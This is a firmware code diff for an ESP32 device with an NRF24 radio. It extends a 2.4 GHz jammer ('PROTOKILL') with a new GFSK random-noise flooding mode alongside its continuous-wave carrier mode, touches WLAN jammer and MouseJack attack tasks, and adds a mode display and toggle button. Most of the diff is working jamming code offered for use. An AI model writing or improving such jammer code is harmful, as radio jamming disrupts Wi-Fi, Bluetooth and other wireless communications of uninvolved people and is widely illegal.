@@ -1705,6 +1705,7 @@ static void wlanJamTask(void* param) {
 
     if (!nrf24Radio.begin()) {
         Serial.println("[WLANJAMMER] Core 0: NRF24 begin() FAILED");
+        SPI.end();
         wlanJamTaskDone = true;
         vTaskDelete(NULL);
         return;
@@ -2341,6 +2342,7 @@ static TaskHandle_t pkJamTaskHandle = NULL;
 static volatile bool pkJamTaskRunning = false;
 static volatile bool pkJamTaskDone = false;
 static volatile int pkJamModeIndex = 2;  // shadow of currentMode for jam task
+static volatile bool pkGfskNoise = false; // false=CW carrier (original), true=GFSK modulated noise
 
 static void pkJamTask(void* param) {
     // ALL SPI + NRF24 operations on core 0
@@ -2351,22 +2353,41 @@ static void pkJamTask(void* param) {
 
     if (!nrf24Radio.begin()) {
         Serial.println("[PROTOKILL] Core 0: NRF24 begin() FAILED");
+        SPI.end();
         pkJamTaskDone = true;
         vTaskDelete(NULL);
         return;
     }
 
-    // startConstCarrier — continuous wave, 100% duty cycle
+    // Snapshot mode at task start (can't switch mid-jam without reinit)
+    bool useNoise = pkGfskNoise;
+
     nrf24Radio.stopListening();
     nrf24Radio.setPALevel(RF24_PA_MAX);
-    nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
-    nrf24Radio.setAddressWidth(5);
-    nrf24Radio.setPayloadSize(2);
     nrf24Radio.setDataRate(RF24_2MBPS);
 
-    Serial.printf("[PROTOKILL] Core 0: CW carrier active, isPVariant=%d\n",
-                  nrf24Radio.isPVariant());
+    if (useNoise) {
+        // GFSK NOISE MODE — modulated random data fills ~2MHz bandwidth
+        // vs CW carrier which is a single narrowband spike
+        nrf24Radio.setAutoAck(false);
+        nrf24Radio.setRetries(0, 0);
+        nrf24Radio.disableCRC();
+        nrf24Radio.setPayloadSize(32);
+        nrf24Radio.setAddressWidth(3);  // minimum = less overhead per packet
+        uint8_t noiseAddr[] = {0xFF, 0xFF, 0xFF};
+        nrf24Radio.openWritingPipe(noiseAddr);
+        Serial.printf("[PROTOKILL] Core 0: GFSK NOISE mode, isPVariant=%d\n",
+                      nrf24Radio.isPVariant());
+    } else {
+        // CW CARRIER MODE — original: unmodulated continuous wave
+        nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
+        nrf24Radio.setAddressWidth(5);
+        nrf24Radio.setPayloadSize(2);
+        Serial.printf("[PROTOKILL] Core 0: CW carrier active, isPVariant=%d\n",
+                      nrf24Radio.isPVariant());
+    }
 
+    uint8_t noiseBuf[32];
     int localHop = 0;
     int yieldCounter = 0;
 
@@ -2379,7 +2400,22 @@ static void pkJamTask(void* param) {
 
         uint8_t ch = m.channels[localHop];
         nrf24Radio.setChannel(ch);
-        delayMicroseconds(m.dwellUs);
+
+        if (useNoise) {
+            // Flood channel with GFSK modulated random data
+            // Each 32-byte packet at 2Mbps = ~154us air time
+            // dwell determines how many packets per channel
+            unsigned long start = micros();
+            unsigned long dwell = (unsigned long)m.dwellUs;
+            // Minimum one packet even for short dwells
+            do {
+                esp_fill_random(noiseBuf, 32);
+                nrf24Radio.write(noiseBuf, 32, true);  // multicast — no ACK wait
+            } while (micros() - start < dwell && pkJamTaskRunning);
+        } else {
+            // CW carrier — just dwell (carrier stays on via startConstCarrier)
+            delayMicroseconds(m.dwellUs);
+        }
 
         // Update shared state for display
         pkCurrentChannel = ch;
@@ -2393,13 +2429,20 @@ static void pkJamTask(void* param) {
         }
     }
 
-    // Cleanup on core 0 — full chip reinit required (same as WLAN Jammer)
-    nrf24Radio.stopConstCarrier();
-    nrf24Radio.begin();       // Full chip reinit — restores CRC, auto-ack, all registers
-    nrf24Radio.powerDown();
+    // Cleanup on core 0
+    if (useNoise) {
+        nrf24Radio.flush_tx();
+        nrf24Radio.powerDown();
+    } else {
+        // CW mode trashes registers — full reinit required
+        nrf24Radio.stopConstCarrier();
+        nrf24Radio.begin();
+        nrf24Radio.powerDown();
+    }
     SPI.end();
 
-    Serial.println("[PROTOKILL] Core 0: Radio fully reset + powered down, SPI released");
+    Serial.printf("[PROTOKILL] Core 0: %s mode stopped, SPI released\n",
+                  useNoise ? "GFSK NOISE" : "CW carrier");
     pkJamTaskDone = true;
     vTaskDelete(NULL);
 }
@@ -2797,14 +2840,25 @@ static void updatePkStats() {
     tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
 
     // Channel
-    tft.fillRect(SCALE_X(35), SCALE_Y(140), SCALE_W(70), 10, TFT_BLACK);
-    tft.setCursor(SCALE_X(35), SCALE_Y(140));
-    tft.printf("CH: %03d", pkCurrentChannel);
+    tft.fillRect(SCALE_X(10), SCALE_Y(140), SCALE_W(60), 10, TFT_BLACK);
+    tft.setCursor(SCALE_X(10), SCALE_Y(140));
+    tft.printf("CH:%03d", pkCurrentChannel);
 
     // Hits
-    tft.fillRect(SCALE_X(130), SCALE_Y(140), SCALE_W(100), 10, TFT_BLACK);
-    tft.setCursor(SCALE_X(130), SCALE_Y(140));
-    tft.printf("HITS: %d", pkHitCount);
+    tft.fillRect(SCALE_X(75), SCALE_Y(140), SCALE_W(65), 10, TFT_BLACK);
+    tft.setCursor(SCALE_X(75), SCALE_Y(140));
+    tft.printf("HIT:%d", pkHitCount);
+
+    // CW/GFSK mode indicator
+    tft.fillRect(SCALE_X(150), SCALE_Y(140), SCALE_W(80), 10, TFT_BLACK);
+    tft.setCursor(SCALE_X(150), SCALE_Y(140));
+    if (pkGfskNoise) {
+        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+        tft.print("GFSK NOISE");
+    } else {
+        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+        tft.print("CW CARRIER");
+    }
 }
 
 static void updatePkStatus() {
@@ -2912,6 +2966,12 @@ void prokillLoop() {
                 waitForTouchRelease();
             }
         }
+    }
+
+    // BTN_SELECT or BTN_UP = toggle CW/GFSK noise mode (only when not jamming)
+    if ((buttonPressed(BTN_SELECT) || buttonPressed(BTN_UP)) && !jammerActive) {
+        pkGfskNoise = !pkGfskNoise;
+        updatePkStats();
     }
 
     if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
@@ -3834,6 +3894,7 @@ static void mjTxTask(void* param) {
 
     if (!nrf24Radio.begin()) {
         Serial.println("[MOUSEJACK] Core 0: NRF24 begin() FAILED");
+        SPI.end();
         mjTaskDone = true;
         vTaskDelete(NULL);
         return;
